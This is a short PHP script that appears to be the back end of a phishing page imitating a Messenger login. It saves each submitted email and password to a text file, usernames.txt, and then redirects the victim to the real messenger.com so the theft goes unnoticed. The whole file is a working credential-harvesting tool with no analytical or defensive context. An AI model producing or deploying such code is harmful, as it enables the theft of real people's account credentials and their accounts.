<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://messenger.com');
exit();
